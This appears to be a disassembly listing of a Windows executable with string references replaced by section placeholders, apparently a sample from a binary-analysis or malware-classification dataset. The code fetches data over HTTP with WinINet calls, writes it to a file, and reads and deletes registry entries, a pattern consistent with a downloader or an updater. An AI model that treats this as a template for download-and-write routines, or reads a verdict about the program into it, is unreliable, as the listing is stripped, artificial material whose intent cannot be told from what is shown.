call sub_40eb9e
add ebp 0x81c
leave
retn
xor edi edi
push edi
push 0x80
push 0x4
push edi
push edi
push 0xc0000000
lea ecx [ esi + 0x1c ]
call j_sub_402624
push eax
call [ CreateFileW@IAT ]
mov [ esi + 0x4c ] eax
mov ecx esi
cmp eax 0xffffffff
je r-xdata
push eax
call sub_40b2dc
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
mov ebx 0x800
cmp eax [ esi + 0x40 ]
jae r-xdata
xor ebx ebx
inc ebx
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x4c ]
mov ecx esi
call sub_40b2dc
mov eax [ esi + 0x40 ]
cmp eax [ esi + 0x44 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
test eax eax
je r-xdata
mov [ esi + 0x48 ] edi
test eax eax
je r-xdata
push edi
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0x14 ]
lea eax [ ebp + 0x18 ]
push eax
push [ esi + 0x4c ]
call [ WriteFile@IAT ]
jmp r-xdata
xor eax eax
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov [ esi + 0x48 ] 0x1
jmp r-xdata
push ebx
lea eax [ ebp + 0x18 ]
push edi
push eax
call sub_414c70
add esp 0xc
lea eax [ ebp + 0x14 ]
push eax
push ebx
lea eax [ ebp + 0x18 ]
push eax
push [ esi + 0x3c ]
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
push edi
push edi
push edi
push [ esi + 0x44 ]
push [ esi + 0x3c ]
call eax
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x4c ]
call [ CloseHandle@IAT ]
mov ecx esi
mov [ esi + 0x4c ] edi
call sub_40b22a
mov eax ebx
push 0x2
push edi
push edi
push [ esi + 0x4c ]
call [ SetFilePointer@IAT ]
sub_40b4ad
cmp [ esp + 0x4 ] 0x0
je r-xdata
push edx
push ecx
call [ SHDeleteKeyW@IAT ]
push [ esp + 0x4 ]
push edx
push ecx
call [ SHDeleteValueW@IAT ]
jmp r-xdata
neg eax
sbb eax eax
inc eax
retn
sub_40b4d0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x10 ]
call sub_40b536
sub esp 0xc
lea ecx [ ebp - 0x10 ]
call sub_40e885
push 0x20006
xor ebx ebx
push ebx
push 0x80000000
call sub_40e8ab
test al al
je r-xdata
lea ecx [ ebp - 0x10 ]
call j_sub_40e891
mov ecx [ ebp - 0x8 ]
pop esi
mov al bl
xor ecx ebp
pop ebx
call sub_40eb9e
leave
retn
push esi
lea ecx [ ebp - 0x10 ]
call sub_40e9b9
test al al
je r-xdata
mov bl 0x1
sub_40b540
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x7c
mov edi ecx
call sub_40f24f
pop ecx
test eax eax
je r-xdata
xor esi esi
mov ecx eax
call sub_401325
mov esi eax
jmp r-xdata
sub esp 0x18
lea eax [ edi + 0x4 ]
mov ecx esp
push eax
call sub_402127
mov ecx esi
call sub_40135a
sub esp 0x18
lea eax [ edi + 0x1c ]
mov ecx esp
push eax
call sub_402127
mov ecx esi
call sub_401386
sub esp 0x18
lea eax [ edi + 0x34 ]
mov ecx esp
push eax
call sub_402127
mov ecx esi
call sub_4013b2
sub esp 0x18
lea eax [ edi + 0x4c ]
mov ecx esp
push eax
call sub_402127
mov ecx esi
call sub_4013de
sub esp 0x18
lea eax [ edi + 0x64 ]
mov ecx esp
push eax
call sub_402127
mov ecx esi
call sub_40140a
pop edi
mov eax esi
pop esi
leave
retn
sub_40b5d0
push 0x928
mov eax sub_41e67b
call sub_411417
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x8fc ] edi
mov [ ebp - 0x904 ] ebx
lea ecx [ ebp - 0x88c ]
mov [ ebp - 0x4 ] ebx
call sub_409799
xor eax eax
inc eax
push r--data
lea ecx [ ebp - 0x8a4 ]
mov [ ebp - 0x8f0 ] eax
mov [ ebp - 0x4 ] al
call sub_402193
xor eax eax
mov esi 0x206
mov [ ebp - 0x4 ] 0x2
push esi
mov [ ebp - 0x46c ] ax
lea eax [ ebp - 0x46a ]
push ebx
push eax
call sub_414c70
xor eax eax
push esi
mov [ ebp - 0x264 ] ax
lea eax [ ebp - 0x262 ]
push ebx
push eax
call sub_414c70
push 0x3c
pop esi
push esi
lea eax [ ebp - 0x8e0 ]
push ebx
push eax
call sub_414c70
lea eax [ ebp - 0x46c ]
mov [ ebp - 0x8d0 ] eax
lea eax [ ebp - 0x264 ]
add esp 0x24
mov [ ebp - 0x8b4 ] eax
mov ecx 0x103
lea eax [ ebp - 0x8e0 ]
push eax
mov [ ebp - 0x8cc ] ecx
mov [ ebp - 0x8b0 ] ecx
push 0x80000000
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x8e0 ] esi
mov [ ebp - 0x8ac ] ebx
mov [ ebp - 0x8a8 ] ebx
mov [ ebp - 0x8bc ] ebx
mov [ ebp - 0x8b8 ] ebx
mov [ ebp - 0x8dc ] ebx
mov [ ebp - 0x8d8 ] ebx
call sub_40228d
push eax
lea ecx [ ebp + 0xc ]
call j_sub_402624
push eax
call [ InternetCrackUrlW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x88c ]
push eax
mov ecx edi
call sub_4020e0
lea ecx [ ebp - 0x8a4 ]
call sub_40223f
lea ecx [ ebp - 0x88c ]
call sub_40211d
lea ecx [ ebp + 0xc ]
call sub_40223f
mov eax edi
call sub_411369
retn 0x1c
push ebx
push ebx
push ebx
push ebx
lea ecx [ ebp - 0x8a4 ]
mov [ ebp - 0x8f8 ] ebx
mov [ ebp - 0x8f4 ] ebx
mov [ ebp - 0x4 ] 0x3
call j_sub_402624
push eax
call [ InternetOpenW@IAT ]
mov [ ebp - 0x900 ] eax
test eax eax
jne r-xdata
push ebx
push ebx
push 0x3
mov ecx r--data
push ecx
push ecx
push ebx
lea ecx [ ebp - 0x46c ]
push ecx
push eax
call [ InternetConnectW@IAT ]
mov ebx eax
mov [ ebp - 0x8f8 ] ebx
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x8e4 ]
push eax
lea ecx [ ebp - 0x910 ]
mov [ ebp - 0x8e4 ] r--data
call sub_41023b
push r--data
lea eax [ ebp - 0x910 ]
xor eax eax
push eax
push 0x80000100
push eax
push eax
push r--data
lea eax [ ebp - 0x264 ]
push eax
push r--data
push ebx
call [ HttpOpenRequestW@IAT ]
mov esi eax
mov [ ebp - 0x8f4 ] esi
test esi esi
jne r-xdata
lea eax [ ebp - 0x8e4 ]
push eax
lea ecx [ ebp - 0x91c ]
mov [ ebp - 0x8e4 ] r--data
call sub_41023b
push r--data
lea eax [ ebp - 0x91c ]
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push esi
call [ HttpSendRequestW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x8e4 ]
push eax
lea ecx [ ebp - 0x934 ]
mov [ ebp - 0x8e4 ] r--data
call sub_41023b
push r--data
lea eax [ ebp - 0x934 ]
jmp r-xdata
push eax
call sub_4112eb
push 0x0
lea eax [ ebp - 0x874 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
push 0x5
push esi
mov [ ebp - 0x874 ] 0x40
call [ HttpQueryInfoW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8e4 ]
push eax
lea ecx [ ebp - 0x928 ]
mov [ ebp - 0x8e4 ] r--data
call sub_41023b
push r--data
lea eax [ ebp - 0x928 ]
jmp r-xdata
mov edx 0x400
mov ecx edx
mov [ ebp - 0x8ec ] edx
lea eax [ ebp - 0x5c ]
push eax
call sub_40f65f
pop ecx
mov ecx eax
mov [ ebp - 0x8ec ] ecx
mov edx 0x400
jmp r-xdata
mov eax [ ebp - 0x870 ]
add [ ebp - 0x8e4 ] eax
sub [ ebp - 0x8ec ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x8f0 ] 0x0
jmp r-xdata
and [ ebp - 0x8e4 ] 0x0
test esi esi
je r-xdata
push eax
lea eax [ ebp - 0x86c ]
push eax
lea ecx [ ebp - 0x88c ]
call sub_409894
mov ecx [ ebp - 0x8ec ]
mov edx 0x400
test ecx ecx
jg r-xdata
mov esi [ InternetCloseHandle@IAT ]
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
jmp r-xdata
mov eax ecx
cmp ecx edx
lea ecx [ ebp - 0x870 ]
push ecx
cmovae eax edx
push eax
lea eax [ ebp - 0x86c ]
push eax
push esi
call [ InternetReadFile@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x900 ]
test eax eax
je r-xdata
push ebx
call esi
test ebx ebx
je r-xdata
push eax
call esi
sub_40b977
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41e5f2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2d8 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ebx [ ebp + 0x8 ]
and [ esp + 0x14 ] 0x0
lea esi [ edi + 0x64 ]
mov ecx esi
call sub_402291
test al al
mov ecx rw-data
cmove ecx esi
push ecx
lea ecx [ esp + 0xb0 ]
call sub_402127
and [ esp + 0x2e0 ] 0x0
mov esi r--data
push esi
lea edx [ edi + 0x1c ]
lea ecx [ esp + 0x20 ]
call sub_402e04
pop ecx
mov edx eax
lea eax [ edi + 0x34 ]
push eax
lea ecx [ esp + 0x38 ]
mov [ esp + 0x2e4 ] 0x1
call sub_40e18f
pop ecx
push esi
mov edx eax
lea ecx [ esp + 0x50 ]
mov [ esp + 0x2e4 ] 0x2
call sub_409abe
pop ecx
mov edx eax
lea eax [ edi + 0x4c ]
push eax
lea ecx [ esp + 0x68 ]
mov [ esp + 0x2e4 ] 0x3
call sub_40e18f
pop ecx
push esi
mov edx eax
lea ecx [ esp + 0x98 ]
mov [ esp + 0x2e4 ] 0x4
call sub_409abe
pop ecx
lea ecx [ esp + 0x64 ]
call sub_40223f
lea ecx [ esp + 0x4c ]
call sub_40223f
lea ecx [ esp + 0x34 ]
call sub_40223f
lea ecx [ esp + 0x1c ]
mov [ esp + 0x2e0 ] 0x9
call sub_40223f
xor eax eax
push 0x206
push eax
mov [ esp + 0xcc ] ax
lea eax [ esp + 0xce ]
push eax
call sub_414c70
add esp 0xc
lea eax [ esp + 0xc4 ]
push [ ebp + 0xc ]
push r--data
push eax
call sub_40f599
add esp 0xc
lea eax [ esp + 0xc4 ]
push eax
lea ecx [ esp + 0x98 ]
call sub_402403
push rw-data
lea ecx [ esp + 0x80 ]
call sub_402127
lea eax [ edi + 0x4 ]
push eax
lea ecx [ esp + 0x80 ]
mov [ esp + 0x2e4 ] 0xa
call sub_4023f3
push r--data
lea ecx [ esp + 0x80 ]
call sub_402403
lea eax [ esp + 0xac ]
push eax
lea ecx [ esp + 0x80 ]
call sub_4023f3
push r--data
lea ecx [ esp + 0x80 ]
call sub_402403
lea eax [ esp + 0x94 ]
push eax
lea ecx [ esp + 0x80 ]
call sub_4023f3
sub esp 0x18
lea eax [ esp + 0x94 ]
mov ecx esp
push eax
call sub_402127
push ebx
call sub_40b5d0
lea ecx [ esp + 0x7c ]
call sub_40223f
lea ecx [ esp + 0x94 ]
call sub_40223f
lea ecx [ esp + 0xac ]
call sub_40223f
mov eax ebx
mov ecx [ esp + 0x2d8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x2c0 ]
xor ecx esp
call sub_40eb9e
mov esp ebp
pop ebp
retn 0x8
sub_40bba6
push 0x3c
mov eax sub_41e638
call sub_4113ab
mov edi ecx
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x48 ] 0x0
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x64 ]
mov ecx esi
call sub_402291
test al al
mov ecx rw-data
cmove ecx esi
push ecx
lea ecx [ ebp - 0x40 ]
call sub_402127
push rw-data
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x1
call sub_402127
lea eax [ edi + 0x4 ]
push eax
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
call sub_4023f3
push r--data
lea ecx [ ebp - 0x28 ]
call sub_402403
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_4023f3
push r--data
lea ecx [ ebp - 0x28 ]
call sub_402403
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_4023f3
sub esp 0x18
lea eax [ ebp - 0x28 ]
mov ecx esp
push eax
call sub_402127
push ebx
call sub_40b5d0
lea ecx [ ebp - 0x28 ]
call sub_40223f
lea ecx [ ebp - 0x40 ]
call sub_40223f
lea ecx [ ebp + 0xc ]
call sub_40223f
mov eax ebx
call sub_41135a
retn 0x1c
sub_40bc65
push 0x4
mov eax sub_41e0ea
call sub_411378
mov edi ecx
mov [ ebp - 0x10 ] edi
lea ecx [ edi + 0x8 ]
mov [ edi ] r--data
mov [ edi + 0x4 ] 0x0
call sub_402150
and [ ebp - 0x4 ] 0x0
lea ecx [ edi + 0x20 ]
call sub_402150
lea ecx [ edi + 0x38 ]
call sub_402150
lea ecx [ edi + 0x50 ]
call sub_40de61
lea ecx [ edi + 0x5c ]
call sub_40de61
lea ecx [ edi + 0x68 ]
call sub_40de61
lea ecx [ edi + 0x74 ]
call sub_40de61
lea ecx [ edi + 0x84 ]
call sub_402150
mov [ ebp - 0x4 ] 0x7
and [ edi + 0x9c ] 0x0
push r--data
lea ecx [ edi + 0x8 ]
call j_sub_402504
mov ecx edi
call sub_40c133
mov ecx edi
call sub_40c25c
mov eax edi
call sub_411346
retn
sub_40bcf5
push esi
mov esi ecx
mov ecx [ esi + 0x9c ]
mov [ esi ] r--data
test ecx ecx
je r-xdata
lea ecx [ esi + 0x84 ]
call sub_40223f
lea ecx [ esi + 0x74 ]
call j_sub_40e057
lea ecx [ esi + 0x68 ]
call j_sub_40e057
lea ecx [ esi + 0x5c ]
call j_sub_40e057
lea ecx [ esi + 0x50 ]
call j_sub_40e057
lea ecx [ esi + 0x38 ]
call sub_40223f
lea ecx [ esi + 0x20 ]
call sub_40223f
lea ecx [ esi + 0x8 ]
pop esi
jmp sub_40223f
push ecx
call sub_401471
and [ esi + 0x9c ] 0x0
sub_40bd59
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41e3e1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea edi [ esi + 0x84 ]
mov ecx edi
call sub_402291
test al al
jne r-xdata
mov ecx [ esi + 0x9c ]
push 0x64
mov eax [ ecx ]
lea edx [ esp + 0x44 ]
push edx
call [ eax + 0x4 ]
lea ecx [ esp + 0x40 ]
call sub_40211d
mov ecx esi
call sub_40bec3
mov ecx [ esi + 0x9c ]
test al al
mov eax [ ecx ]
je r-xdata
sub esp 0x18
mov ecx esp
push edi
call sub_402127
mov ecx [ esi + 0x9c ]
call sub_40140a
push 0x65
lea edx [ esp + 0x2c ]
push edx
call [ eax + 0x4 ]
lea ecx [ esp + 0x28 ]
call sub_40211d
xor al al
push 0x66
lea edx [ esp + 0x14 ]
push edx
call [ eax + 0x4 ]
lea ecx [ esp + 0x10 ]
call sub_40211d
push r--data
lea edx [ esi + 0x20 ]
lea ecx [ esp + 0x44 ]
call sub_402e04
pop ecx
and [ esp + 0x68 ] 0x0
lea eax [ esp + 0x40 ]
push eax
mov ecx esi
call sub_40c307
mov ecx esi
call sub_40c79b
mov ecx esi
call sub_40c7dd
call sub_40c9e8
mov ecx esi
call sub_40c85f
mov ecx esi
call sub_40d16e
mov ecx esi
call sub_40cec5
mov ecx esi
call sub_40ca2c
mov ecx esi
call sub_40d2fc
mov ecx [ esi + 0x9c ]
push 0x67
mov eax [ ecx ]
lea edx [ esp + 0x14 ]
push edx
call [ eax + 0x4 ]
lea ecx [ esp + 0x10 ]
call sub_40211d
lea ecx [ esp + 0x40 ]
call sub_40223f
mov al 0x1
jmp r-xdata
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x4c ]
xor ecx esp
call sub_40eb9e
mov esp ebp
pop ebp
retn
sub_40bec3
push esi
mov esi ecx
call sub_40c133
test al al
je r-xdata
xor al al
pop esi
retn
lea ecx [ esi + 0x38 ]
call sub_40228d
cmp eax 0x2
jb r-xdata
sub esp 0xc
lea ecx [ esi + 0x38 ]
call sub_40de40
test eax eax
jne r-xdata
mov al 0x1
pop esi
retn
sub_40bef3
push 0x244
mov eax sub_41e4af
call sub_4113ab
mov ebx ecx
lea edi [ ebx + 0x20 ]
mov ecx edi
call sub_402291
test al al
jne r-xdata
lea ecx [ ebp - 0x230 ]
call sub_402150
and [ ebp - 0x4 ] 0x0
push ecx
lea ecx [ ebp - 0x238 ]
call sub_40b536
sub esp 0xc
lea ecx [ ebp - 0x238 ]
call sub_40e885
push 0x20019
push r--data
push 0x80000002
mov [ ebp - 0x4 ] 0x1
call sub_40e8ab
lea eax [ ebp - 0x230 ]
push eax
push r--data
lea ecx [ ebp - 0x238 ]
call sub_40e904
test al al
je r-xdata
inc al
jmp r-xdata
lea ecx [ ebp - 0x238 ]
call sub_40e891
mov ecx edi
call sub_402291
test al al
je r-xdata
push ecx
push ecx
lea ecx [ ebp - 0x230 ]
call sub_40dddf
cmp eax 0xffffffff
je r-xdata
call sub_41135a
retn
mov ecx edi
call sub_402291
mov bl al
neg bl
sbb bl bl
lea ecx [ ebp - 0x238 ]
inc bl
call j_sub_40e891
lea ecx [ ebp - 0x230 ]
call sub_40223f
mov al bl
xor eax eax
push 0x206
push eax
mov [ ebp - 0x218 ] ax
lea eax [ ebp - 0x216 ]
push eax
call sub_414c70
add esp 0xc
lea eax [ ebp - 0x218 ]
push 0x104
push eax
push r--data
call [ ExpandEnvironmentStringsW@IAT ]
test eax eax
je r-xdata
push eax
push 0x0
lea eax [ ebp - 0x250 ]
push eax
lea ecx [ ebp - 0x230 ]
call sub_40ddf9
push eax
lea ecx [ ebp - 0x230 ]
call sub_4021e3
lea ecx [ ebp - 0x250 ]
call sub_40223f
lea ecx [ ebp - 0x230 ]
call sub_40e4b9
push r--data
lea edx [ ebp - 0x230 ]
lea ecx [ ebp - 0x250 ]
call sub_402e04
pop ecx
mov ecx eax
call j_sub_402624
push eax
call [ PathFileExistsW@IAT ]
lea ecx [ ebp - 0x250 ]
mov esi eax
call sub_40223f
test esi esi
je r-xdata
lea eax [ ebp - 0x218 ]
push eax
lea ecx [ ebp - 0x230 ]
call j_sub_402504
lea ecx [ ebp - 0x230 ]
call sub_40e4b9
lea ecx [ ebp - 0x230 ]
call sub_40228d
dec eax
push eax
lea ecx [ ebp - 0x230 ]
call sub_40dd9e
cmp [ eax ] 0x5c
jne r-xdata
lea eax [ ebp - 0x230 ]
push eax
mov ecx edi
call sub_402249
push r--data
lea ecx [ ebp - 0x230 ]
call sub_402403
lea eax [ ebx + 0x8 ]
push eax
lea ecx [ ebp - 0x230 ]
call sub_4023f3
push r--data
lea edx [ ebp - 0x230 ]
lea ecx [ ebp - 0x250 ]
call sub_402e04
pop ecx
mov ecx eax
call j_sub_402624
push eax
call [ PathFileExistsW@IAT ]
lea ecx [ ebp - 0x250 ]
mov esi eax
call sub_40223f
test esi esi
je r-xdata
lea ecx [ ebp - 0x230 ]
call sub_40ddba
lea eax [ ebp - 0x230 ]
push eax
mov ecx edi
call sub_402249
sub_40c133
push 0x54
mov eax sub_41e4ef
call sub_4113ab
mov edi ecx
lea esi [ edi + 0x38 ]
mov ecx esi
call sub_402291
test al al
jne r-xdata
mov ecx edi
call sub_40bef3
test al al
je r-xdata
inc al
jmp r-xdata
mov ecx esi
call sub_402291
xor ecx ecx
test al al
sete cl
mov al cl
lea ecx [ ebp - 0x30 ]
call sub_402150
and [ ebp - 0x4 ] 0x0
push ecx
lea ecx [ ebp - 0x18 ]
call sub_40b536
sub esp 0xc
lea ecx [ ebp - 0x18 ]
call sub_40e885
push 0x20019
push r--data
push 0x80000002
mov [ ebp - 0x4 ] 0x1
call sub_40e8ab
lea eax [ ebp - 0x30 ]
push eax
push r--data
lea ecx [ ebp - 0x18 ]
call sub_40e904
test al al
je r-xdata
call sub_41135a
retn
lea ecx [ ebp - 0x18 ]
call sub_40e891
lea ecx [ ebp - 0x30 ]
call sub_402291
test al al
je r-xdata
lea ecx [ ebp - 0x30 ]
call sub_40e4b9
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call sub_402249
lea ecx [ ebp - 0x18 ]
call j_sub_40e891
lea ecx [ ebp - 0x30 ]
call sub_40223f
push r--data
lea ecx [ edi + 0x20 ]
call sub_402403
push eax
lea ecx [ ebp - 0x48 ]
call sub_402127
lea edx [ ebp - 0x48 ]
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x2
call sub_40dc07
push eax
lea ecx [ ebp - 0x30 ]
call sub_4021e3
lea ecx [ ebp - 0x60 ]
call sub_40223f
lea ecx [ ebp - 0x30 ]
call sub_40e4b9
lea ecx [ ebp - 0x30 ]
call sub_402291
test al al
jne r-xdata
lea ecx [ ebp - 0x48 ]
call sub_40223f
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call sub_402249
sub_40c25c
push 0x24
mov eax sub_41e474
call sub_4113ab
mov esi ecx
push ecx
lea ecx [ ebp - 0x18 ]
call sub_40b536
sub esp 0xc
lea ecx [ ebp - 0x18 ]
call sub_40e885
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x30 ]
call sub_402150
push 0x20019
push r--data
push 0x80000002
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x1
call sub_40e8ab
lea eax [ ebp - 0x30 ]
push eax
push r--data
lea ecx [ ebp - 0x18 ]
call sub_40e904
test al al
je r-xdata
lea ecx [ ebp - 0x18 ]
call sub_40e891
lea ecx [ esi + 0x84 ]
call sub_40e473
lea ecx [ esi + 0x84 ]
call sub_402291
mov bl al
neg bl
sbb bl bl
lea ecx [ ebp - 0x30 ]
inc bl
call sub_40223f
lea ecx [ ebp - 0x18 ]
call j_sub_40e891
mov al bl
call sub_41135a
retn
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ esi + 0x84 ]
call sub_402249
sub_40c307
push 0xffffffff
push sub_41e577
mov eax [ fs : 0x0 ]
push eax
sub esp 0x188
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x180 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x19c ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ esp + 0x1ac ]
mov ecx esi
call sub_402291
test al al
jne r-xdata
xor al al
mov ecx esi
call j_sub_402624
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
push ecx
lea ecx [ esp + 0x1c ]
call sub_401fa8
lea ecx [ esp + 0x18 ]
call sub_40de61
xor eax eax
mov [ esp + 0x1a4 ] eax
push 0x103
push eax
mov [ esp + 0x94 ] al
lea eax [ esp + 0x95 ]
push eax
call sub_414c70
add esp 0xc
mov ecx esi
push r--data
call j_sub_402624
push eax
call sub_40f673
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
lea ecx [ esp + 0x44 ]
call sub_402150
push ecx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x1a8 ] 0x4
call j_sub_40b224
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x1c ]
call sub_40def1
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x1c ]
call sub_40df04
push eax
lea ecx [ esp + 0x18 ]
call sub_40df52
test al al
je r-xdata
mov ebx 0x104
jmp r-xdata
lea ecx [ esp + 0x44 ]
call sub_40223f
lea ecx [ esp + 0x18 ]
call j_sub_40e057
mov al 0x1
jmp r-xdata
mov ebp r--data
mov ebx r--data
push esi
lea eax [ esp + 0x90 ]
push ebx
push eax
call sub_40fd78
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esp + 0x19c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x180 ]
xor ecx esp
call sub_40eb9e
add esp 0x194
retn 0x4
push r--data
mov ecx esi
call j_sub_402624
push eax
call sub_4103f0
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
jmp r-xdata
lea ecx [ esp + 0x74 ]
call sub_409799
lea eax [ esp + 0x8c ]
push eax
mov [ esp + 0x1a8 ] 0x1
call [ lstrlenA@IAT ]
cmp eax ebx
jge r-xdata
push esi
call sub_40f7be
pop ecx
push r--data
mov ecx esi
call j_sub_402624
push eax
call sub_4103f0
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
jmp r-xdata
lea ecx [ esp + 0x48 ]
jmp r-xdata
lea eax [ esp + 0x8c ]
push eax
lea ecx [ esp + 0x78 ]
call j_sub_40230a
lea ecx [ esp + 0x74 ]
call j_sub_40239d#2
mov edx eax
lea ecx [ esp + 0x5c ]
call sub_40e515
lea ecx [ esp + 0x5c ]
mov [ esp + 0x1a4 ] 0x2
call j_sub_402624
push eax
lea ecx [ esp + 0x30 ]
call sub_402193
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x1c ]
mov [ esp + 0x1a8 ] 0x3
call sub_40de6e
lea ecx [ esp + 0x2c ]
call sub_40223f
lea ecx [ esp + 0x5c ]
call sub_40223f
cmp [ esp + eax + 0x8b ] 0xa
jne r-xdata
push r--data
mov ecx esi
call j_sub_402624
push eax
call sub_4103f0
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
jmp r-xdata
call j_sub_402504
jmp r-xdata
cmp eax 0x1
je r-xdata
push r--data
mov ecx esi
call j_sub_402624
push eax
call sub_4103f0
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
jmp r-xdata
push ecx
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x1c ]
call sub_40df30
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x1c ]
call sub_40df04
push eax
lea ecx [ esp + 0x18 ]
call sub_40df52
test al al
jne r-xdata
lea ecx [ esp + 0x74 ]
call sub_40211d
dec eax
cmp eax ebx
jae r-xdata
push ebp
mov ecx esi
call j_sub_402624
push eax
call sub_4103f0
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
jmp r-xdata
lea ecx [ esp + 0x14 ]
call sub_40df18
mov esi eax
push r--data
mov ecx esi
call j_sub_402624
push eax
call sub_4103f0
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_410161
mov [ esp + eax + 0x8c ] 0x0
push ebx
mov ecx esi
call j_sub_402624
push eax
call sub_4103f0
pop ecx
pop ecx
lea ecx [ esp + 0x44 ]
test eax eax
jne r-xdata
push ebp
push r--data
call j_sub_402624
push eax
call sub_4103f0
pop ecx
pop ecx
test eax eax
jne r-xdata
push ebx
push r--data
lea ecx [ esp + 0x48 ]
call j_sub_402624
push eax
call sub_4103f0
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx esi
call j_sub_402624
push eax
lea ecx [ esp + 0x60 ]
call sub_402193
mov [ esp + 0x1a4 ] 0x5
lea ecx [ edi + 0x50 ]
jmp r-xdata
push r--data
lea ecx [ esp + 0x48 ]
call j_sub_402624
push eax
call sub_4103f0
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ esp + 0x5c ]
push eax
call sub_40de6e
lea ecx [ esp + 0x5c ]
mov [ esp + 0x1a4 ] 0x4
call sub_40223f
jmp r-xdata
push r--data
lea ecx [ esp + 0x48 ]
call j_sub_402624
push eax
call sub_4103f0
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx esi
call j_sub_402624
push eax
lea ecx [ esp + 0x60 ]
call sub_402193
mov [ esp + 0x1a4 ] 0x6
lea ecx [ edi + 0x74 ]
jmp r-xdata
push r--data
lea ecx [ esp + 0x48 ]
call j_sub_402624
push eax
call sub_4103f0
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx esi
call j_sub_402624
push eax
lea ecx [ esp + 0x60 ]
call sub_402193
mov [ esp + 0x1a4 ] 0x7
lea ecx [ edi + 0x5c ]
jmp r-xdata
push ebp
lea ecx [ esp + 0x48 ]
call j_sub_402624
push eax
call sub_4103f0
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx esi
call j_sub_402624
push eax
lea ecx [ esp + 0x60 ]
call sub_402193
mov [ esp + 0x1a4 ] 0x8
lea ecx [ edi + 0x68 ]
push ebx
lea ecx [ esp + 0x48 ]
call j_sub_402624
push eax
call sub_4103f0
pop ecx
pop ecx
sub_40c79b
push 0x1c
mov eax sub_41e6ab
call sub_4113ab
mov esi ecx
call j_sub_40e807
test al al
jne r-xdata
call sub_41135a
retn
push r--data
lea edx [ esi + 0x20 ]
lea ecx [ ebp - 0x28 ]
call sub_402e04
pop ecx
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_40d981
lea ecx [ ebp - 0x28 ]
call sub_40223f
sub_40c7dd
push ebp
mov ebp esp
push ecx
push ecx
push esi
